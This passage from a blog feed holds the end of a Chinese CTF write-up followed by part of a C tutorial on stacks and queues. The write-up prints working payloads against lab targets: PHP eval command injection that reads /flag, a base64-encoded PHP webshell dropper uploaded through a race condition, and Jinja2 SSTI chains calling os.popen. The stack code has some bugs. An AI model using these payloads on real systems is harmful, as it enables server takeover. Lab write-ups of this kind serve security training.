alt="image-20231014215521978"></p><p>可以看到index文件开头执行了flag.php，于是构造payl为<code>pphphphpp://filtfilterer/convert.babasese64-encode/resource=flag.pphphphpp</code>直接查看flag，再解码即可。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215636748.png" alt="image-20231014215636748"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215701209.png" alt="image-20231014215701209"></p><p>得到flag<code>XSCTF&#123;d0ubLe_Wr1te_2_byPass&#125;</code>。</p><h3 id="eval-eval-我的"><a href="#eval-eval-我的" class="headerlink" title="eval_eval_我的"></a>eval_eval_我的</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215750403.png" alt="image-20231014215750403"></p><p>进入容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014215810981.png" alt="image-20231014215810981"></p><p>又是一道PHP代码审计题</p><p>题目要求get传参xsctf，且用正则过滤黑名单。如果通过则再检验post传参Xp0int和Sloth，要求两参数不相同但md5值强相等，如果通过则执行eval函数。这题要在正则过滤的限制下利用文件执行漏洞执行xsctf获得flag。</p><p>首先考虑参数Xp0int和Sloth，用数组绕过即可。post传参<code>Xp0int[]=0&amp;Sloth[]=1</code>即可。</p><p>接下来考虑如何绕过正则来执行文件。</p><p>构造payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?xsctf=echo(`ls`);</span><br></pre></td></tr></table></figure><p>因为过滤了空格，用<code>echo()</code>来绕过。同时用反引号``，在PHP中会把echo反引号内的内容当做PHP代码执行，效果如下。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014220943778.png" alt="image-20231014220943778"></p><p>无敏感文件，继续查看上一级目录。构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?xsctf=echo(`ls\x20/`);</span><br></pre></td></tr></table></figure><p>用\x20来绕过空格，\x20在PHP中被解释为空格，得到以下结果。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014221507041.png" alt="image-20231014221507041"></p><p>发现flag，查看文件。构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?xsctf=echo(`ca&#x27;&#x27;t\x20/fl&#x27;&#x27;ag`);</span><br></pre></td></tr></table></figure><p>使用双单引号绕过正则匹配，得到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231014221740959.png" alt="image-20231014221740959"></p><p>flag为<code>XSCTF&#123;YoU_F1NalLy_EvaLLL_m3!!&#125;</code>。</p><h3 id="upload-quick"><a href="#upload-quick" class="headerlink" title="upload_quick"></a>upload_quick</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131246415.png" alt="image-20231015131246415"></p><p>开启容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131312723.png" alt="image-20231015131312723"></p><p>是一个登录界面，尝试输入账户密码登录。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131347330.png" alt="image-20231015131347330"></p><p>无论输入什么都会被弹窗打断，没有任何反应。同时发现右键被禁用，于是Ctrl+U查看源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131516279.png" alt="image-20231015131516279"></p><p>大概的意思是，无论在登录框执行什么操作都会被打断。于是开始查看其他方面，同时发现四个可疑JS文件，查看之。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131633889.png" alt="image-20231015131633889"></p><p>其中EasePack.min.js很明显经过了混淆，使用在线工具网站<a href="https://tool.chinaz.com/Tools/JsFormat.aspx">JS&#x2F;HTML格式化 - 站长工具 (chinaz.com)</a>来反混淆。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131750553.png" alt="image-20231015131750553"></p><p>复制到本地查看。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131835200.png" alt="image-20231015131835200"></p><p>代码末尾发现hint，根据提示访问&#x2F;Upl00000000ad.php。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015131944047.png" alt="image-20231015131944047"></p><p>发现是一个文件上传页面，从这里可以确定这道题其实是一个文件上传漏洞题。</p><p>上传测试木马。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132036657.png" alt="image-20231015132036657"></p><p>木马被检测到，同时返回了一个文件上传的地址，访问。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132156329.png" alt="image-20231015132156329"></p><p>下载图片打开，发现内容并没有被更改。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132346619.png" alt="image-20231015132346619"></p><div align=center >下载下来被火绒秒删……说明是我写的木马没错</div><p>既然写入的一句话木马没有被修改，尝试用蚁剑连接webshell，连接失败，说明文件没有被执行，所以上传图片马的方法也可以排除了。</p><p>既然php后缀被拦截，抓包修改文件名试试上传其他的文件后缀。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132744364.png" alt="image-20231015132744364"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015132833820.png" alt="image-20231015132833820"></p><p>经过实验，只有图片格式后缀不被拦截，确定拦截方式为白名单。尝试使用%00截断绕过。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015133056288.png" alt="image-20231015133056288"></p><p>绕过失败。</p><p>此时只剩下一种方法，条件竞争。条件竞争，就是把文件上传到服务器，而服务器判断文件是否合法需要时间，在此时访问上传的木马文件，就可以实现植入后门的操作。当然，这样要求的时间很短速度很快，仅凭手速是达不到的，我们需要不断的上传木马文件同时发送访问请求，这与题目名upload_quick不谋而合。至此，基本可以确定是条件竞争上传。</p><p>要确定一个题目是条件竞争，我们首先要知道文件上传的位置才能进行访问。这里虽然每次返回的都是一串随机字符文件名，但都是在uploads文件夹下，所以我们大胆猜测上传的文件会被暂时储存在uploads下，如果服务器判定文件非法则会修改其文件名和文件后缀返回给用户。也就是说，我们要不断地上传木马文件的同时，不断的访问uploads&#x2F;xxx.php。</p><p>那么准备工作开始。</p><p>首先准备条件竞争的木马。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+&#x27;</span>;</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主要的功能是如果木马被执行&#x2F;访问成功，则写入另一个木马shell.php，这样即使自己被删掉也可以留下一个后门。</p><p>这里需要写入的内容使用了base64加密，原因是如果你直接将$a&#x3D;一句话木马，生成的文件中将不会含有$_POST[‘xxx’] ，所以我们需要使用base64加密。</p><p>接下来准备bp爆破，不断地向服务器上传木马文件，将上传文件的数据包抓包发送给intruder模块。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134611264.png" alt="image-20231015134611264"></p><p>尽管后面使用<strong>Null payload</strong>，但仍然需要<strong>设定一个变量</strong>。而且这个变量最好是空格作为变量。如果随意选取一个变量，他会把你的变量变成空。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134740689.png" alt="image-20231015134740689"></p><p>payload配置类型为<strong>Null payload</strong>，并无限重复发送。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015134801650.png" alt="image-20231015134801650"></p><p>这里本来还应该开启多线程上传增加成功率，但是我的bp版本没有多线程的功能，所以我开启了两个bp同时上传文件，配置方法相同。</p><p>最后是Python监听脚本，用来不断的发送访问请求，同时监听是否访问成功，脚本代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.200:40037/uploads/tiaojian3.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;YES,you upload it!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure><p>万事俱备只欠东风，启动bp爆破和Python监听脚本。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135140655.png" alt="image-20231015135140655"></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135231566.png" alt="image-20231015135231566"></p><p>成功访问，此时用蚁剑尝试链接webshell。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135347012.png" alt="image-20231015135347012"></p><p>连接成功，翻看目录找到flag。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015135443813.png" alt="image-20231015135443813"></p><p>flag为<code>XSCTF&#123;1iL3_UP1oOOO0oOO4d_In7ereS7iNG_fe2accc0eed4&#125;</code>。</p><h3 id="你买车票没"><a href="#你买车票没" class="headerlink" title="你买车票没"></a>你买车票没</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162100798.png" alt="image-20231015162100798"></p><p>最mhy的一集……首先进入容器。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162205624.png" alt="image-20231015162205624"></p><p>一个简陋的登录页面，十分简陋，查看源代码也没有发现有价值的信息。尝试抓包，同样没有什么进展。不管输入什么，都会弹出窗口显示没有车票。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162323357.png" alt="image-20231015162323357"></p><p>尝试SQL注入，用sqlmap扫了两小时无果，于是考虑SSTI模板注入。</p><p>传入参数49，返回49，说明改题存在SSTI注入漏洞，注入点为用户名&#x2F;name。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015162511752.png" alt="image-20231015162511752"></p><p>做题思路如下：</p><blockquote><p>通过python的对象的继续来一步步实现文件的读取和命令执行的<br>首先用__class__读取当前类对象的类<br>然后用__mro__或者__base__寻找基类<br>然后用__subclasses__找命令执行或者文件操作的模块<br>然后使用__init__声明<br>然后使用__globals__引用模块<br>————————————————<br>原文链接：<a href="https://blog.csdn.net/weixin_46342884/article/details/123246354">https://blog.csdn.net/weixin_46342884/article/details/123246354</a></p></blockquote><p>我们按照这个思路一步步做题。</p><p>首先传入49测试确实存在SSTI注入，我们已经做过了。</p><p>然后，读取当前字符的类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163336358.png" alt="image-20231015163336358"></p><p>这一坨乱码是HTML编码，我们暂时不用管它，不过为了方便阅读起见，我把解码后的文本丢在这里<code>&lt;class &#39;flask.config.Config&#39;&gt;,</code>。</p><p>接着我们查找基类，构造如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163540505.png" alt="image-20231015163540505"></p><p><code>(&lt;class &#39;flask.config.Config&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code></p><p>继续选择基类查找命令执行或者文件操作的模块：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为这里object在第三位，而python是从0开始计数的所以写2，为什么选择object，因为它是所有类的父类，默认所有的类都继承至Object类。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015163744611.png" alt="image-20231015163744611"></p><p>得到的内容有亿点点多……</p><p>首先把它们全部转为HTML格式，然后扔Python跑脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;此处省略亿点点内容&#x27;&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;&#x27;?id=[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ...., &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;],没买车票不能上车!!!&quot;);&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=s.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ssti查找结果.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> p:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        p.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后去新的文本文件里查找要用的模块popen。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164139328.png" alt="image-20231015164139328"></p><p>第352个，减一就是第351个数组元素。</p><p>最后引用模块执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__[2].__subclasses__()[351].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164848512.png" alt="image-20231015164848512"></p><p>回显直接不见了，好家伙，原来在源码里。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015164915434.png" alt="image-20231015164915434"></p><p>发现flag，构造payload得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__mro__[2].__subclasses__()[351].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat+flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果是在name框里传参直接把<code>cat+flag</code>改成<code>cat flag</code>就好。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231015165314336.png" alt="image-20231015165314336"></p><p>flag为<code>XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125;</code></p><hr><p>完结线！撒花~✿✿ヽ(°▽°)ノ✿。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300008.jpg" alt="300008"></p>]]></content>
    
    
    <summary type="html">2023XSCTF招新赛Web，Misc部分WP</summary>
    
    
    
    <category term="CTF Write Up" scheme="http://example.com/categories/CTF-Write-Up/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Misc" scheme="http://example.com/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>数据结构什锦（三）——栈与队列篇</title>
    <link href="http://example.com/2023/10/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E7%AF%87/"/>
    <id>http://example.com/2023/10/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E7%AF%87/</id>
    <published>2023-10-09T06:42:11.000Z</published>
    <updated>2023-10-25T12:46:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>这里我们来学习队列和栈的数据结构。</p><hr><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h2><p><strong>栈</strong>（stack）是一个有序序列，只能在称为栈顶的一段进行数据的插入和删除的操作，最后一个插入的元素是第一个被删除的元素。所以栈也被称作“先进后出”表（LIFO）或“后进先出”表（FILO）。</p><p>对栈操作的方法有特殊的称呼。比如把数据插入栈，称为向栈<strong>压入</strong>（push）一个元素，而把数据从栈中删除，我们称为从栈<strong>弹出</strong>（pop）一个元素。从空栈中弹出元素会发生<strong>下溢</strong>（underflow），而向满栈压入元素会发生<strong>上溢</strong>（overflow）。我们把上溢和下溢统称为<strong>异常</strong>（exception）。</p><h2 id="栈的抽象数据类型-ADT"><a href="#栈的抽象数据类型-ADT" class="headerlink" title="栈的抽象数据类型&#x2F;ADT"></a>栈的抽象数据类型&#x2F;ADT</h2><p>为了简单起见，我们先把栈的内容数据类型设置为整形int。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>Push(int data)：将元素data压入栈中</li><li>int Pop()：从栈顶中弹出元素，并返回该元素的值。</li><li>int Top()：返回栈顶元素的值，但是不删除该元素</li><li>int Size()：返回栈中元素个数</li><li>int IsEmptyStack()：判断栈是否为空</li><li>int IsFullStack()：判断栈是否为满</li></ul><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>有时候栈的操作不能执行，比如向空栈中弹出元素或者向满栈中压入元素，此时Push()函数和Pop()函数无法正常执行，这时我们要求程序要抛出（throw）一个异常。</p><h2 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h2><ul><li>符号平衡</li><li>中缀表达式转后缀表达式</li><li>后缀表达式的计算</li><li>函数调用的实现</li><li>查找划分</li><li>Web浏览器的访问历史</li><li>文本编辑器的撤销功能</li><li>HTML和XML的标签匹配</li></ul><h2 id="栈的实现"><a href="#栈的实现" class="headerlink" title="栈的实现"></a>栈的实现</h2><p>栈的抽象数据类型有几种实现方法，下面我们介绍三种。</p><ul><li>基于简单数组的实现</li><li>基于动态数组的实现</li><li>基于链表的实现</li></ul><h3 id="基于简单数组的实现"><a href="#基于简单数组的实现" class="headerlink" title="基于简单数组的实现"></a>基于简单数组的实现</h3><p>在数组中，我们从左向右的给数组添加元素，并使用一个辅助变量跟踪栈顶元素在数组中的下标。</p><p>数组实现的栈是会变满的，所以可能发生上溢异常。当数组为空时弹出元素也会发生下溢异常。</p><p>以下是代码的实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayStack</span> &#123;</span></span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> capacity;</span><br><span class="line"><span class="type">int</span>* <span class="built_in">array</span>;<span class="comment">//一个辅助指针指向栈顶</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> ArrayStack* <span class="title function_">CreateStack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayStack</span>* <span class="title">S</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ArrayStack));</span><br><span class="line"><span class="keyword">if</span> (!S)<span class="comment">//如果创建新栈失败返回空</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">S-&gt;capacity = <span class="number">1</span>;<span class="comment">//数组的容量，应该是初始化时可以更改的</span></span><br><span class="line">S-&gt;top - <span class="number">1</span>;<span class="comment">//最开始空栈的top为-1代表不存在，一个元素时为0，对应数组的0下标</span></span><br><span class="line">S-&gt;<span class="built_in">array</span> = <span class="built_in">malloc</span>(S-&gt;capacity * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">//声明一个数组用来储存压入栈的数据</span></span><br><span class="line"><span class="keyword">if</span> (!S-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> S;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyStack</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(S-&gt;top == <span class="number">-1</span>);<span class="comment">//如果相等返回1，否则返回0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFullStack</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(S-&gt;top == S-&gt;capacity - <span class="number">1</span>);<span class="comment">//同上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsFullStack(S))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack overflow&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">S-&gt;<span class="built_in">array</span>[++S-&gt;top] = data;</span><br><span class="line"><span class="comment">/*首先栈顶标识符自增，然后向数组对应下标存入元素*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pop</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsEmptyStack(S)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">/*返回栈顶的元素，然后top减1*/</span></span><br><span class="line"><span class="keyword">return</span>(S-&gt;<span class="built_in">array</span>[S-&gt;top--]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteStack</span><span class="params">(<span class="keyword">struct</span> ArrayStack* S)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (S) &#123;</span><br><span class="line"><span class="keyword">if</span> (S-&gt;<span class="built_in">array</span>) &#123;</span><br><span class="line"><span class="built_in">free</span>(S-&gt;<span class="built_in">array</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(S);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法存在一个局限性，就是数组的大小需要事先指定，而且超出数组大小时压入元素会发生上溢。</p><p>最后总结一下使用静态数组实现栈的思路。我们使用一个下标变量top，用它来指向栈中最近插入元素的位置。为了插入一个元素，我们增加top元素的值，并把新元素放到top指定的位置上。为了弹出一个元素，我们先返回top上的元素，然后让top减1。</p><h3 id="基于动态数组的实现"><a href="#基于动态数组的实现" class="headerlink" title="基于动态数组的实现"></a>基于动态数组的实现</h3><p>因为使用静态数组时栈的大小有限制，会发生上溢异常。为了动态的调整栈的大小，我们可以使用动态数组，当我们使用动态数组时，我们有两种思路。</p><p>首先是当每一次栈满时，我们就把栈的大小加1。但这样会造成巨大的时间开销。假如我们的数组初始长度为1，最后长度为n-1，当满栈时我们就要新建一个长度为n的数组，然后将n-1个元素复制过来。而这之前我们已经过（1+2+……+n-1）次复制操作，这样的算法时间复杂度为O(n^2^)。</p><p>另一种方法就是重复翻倍的思想。每当栈满时，我们就创建一个长度为当前数组的两倍的数组，再将元素复制过去。这样我们的算法时间复杂度就变成了O(n)。</p><p>注意，过多的翻倍操作可能会导致内存上溢。</p><h3 id="基于链表的实现"><a href="#基于链表的实现" class="headerlink" title="基于链表的实现"></a>基于链表的实现</h3><p>利用链表也可以实现栈。Push操作通过在链表的首部插入元素来实现，而Pop操作则是删除链表的头部元素来实现。</p><p>以下是代码实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span> &#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Stack* <span class="title function_">CreateStack</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(<span class="keyword">struct</span> Stack** top, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">temp</span>;</span></span><br><span class="line">temp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Stack));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!temp)<span class="comment">//新节点申请不成功则返回空</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = *top;<span class="comment">//新节点指向原头节点</span></span><br><span class="line"></span><br><span class="line">*top = temp;<span class="comment">//修改头指针指向新节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyStack</span><span class="params">(<span class="keyword">struct</span> Stack* top)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (top == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Pop</span><span class="params">(<span class="keyword">struct</span> Stack** top)</span> &#123;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">temp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IsEmptyStack(top))</span><br><span class="line"><span class="keyword">return</span> INT_MIN;<span class="comment">//如果是空栈，则返回一个最小int值</span></span><br><span class="line"></span><br><span class="line">temp = *top;<span class="comment">//临时变量储存要弹出的位置</span></span><br><span class="line">*top = (*top)-&gt;next;<span class="comment">//将头指针指向下一个变量</span></span><br><span class="line">data = temp-&gt;data;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(temp);<span class="comment">//释放弹出数据的位置</span></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Top</span><span class="params">(<span class="keyword">struct</span> Stack* top)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsEmptyStack(top))</span><br><span class="line"><span class="keyword">return</span> INT_MIN;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (top-&gt;next)-&gt;data;<span class="comment">//返回栈顶元素</span></span><br><span class="line"><span class="comment">/*注意这里top指向的节点是一个*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteStack</span><span class="params">(<span class="keyword">struct</span> Stack** top)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stack</span>* <span class="title">temp</span>, * <span class="title">p</span>;</span></span><br><span class="line">p = *top;<span class="comment">//p为头指针的一个副本</span></span><br><span class="line"><span class="keyword">while</span> (p-&gt;next) &#123;</span><br><span class="line"><span class="comment">//循环条件 p指向的下一个元素不为空</span></span><br><span class="line">temp = p-&gt;next;</span><br><span class="line">p-&gt;next = temp-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp);<span class="comment">//释放临时变量指向的节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(p);<span class="comment">//释放最后一个节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h2 id="什么是队列"><a href="#什么是队列" class="headerlink" title="什么是队列"></a>什么是队列</h2><p>队列（queue）是一个有序序列，只能在序列的一段（rear）插入元素，而在另一端（front）进行删除操作。最先被插入的元素也是最先被删除的元素。所以队列又被称为“先进先出”表（FIFO）或者“后进后出”表（LILO）</p><p>与栈类似，队列的插入和删除也有特定的称谓。队列在队尾进行插入操作我们称为入列（EnQueue）操作，删除队首元素，我们称之为出列（Dequeue）操作。</p><p>对空队列执行出列操作称为下溢（underflow）错误，对满队列执行入列操作称为上溢（overflow）错误。这些错误统称为异常（exception）。</p><h2 id="队列的抽象数据类型-ADT"><a href="#队列的抽象数据类型-ADT" class="headerlink" title="队列的抽象数据类型&#x2F;ADT"></a>队列的抽象数据类型&#x2F;ADT</h2><p>假设数据元素为整形。</p><h3 id="操作-1"><a href="#操作-1" class="headerlink" 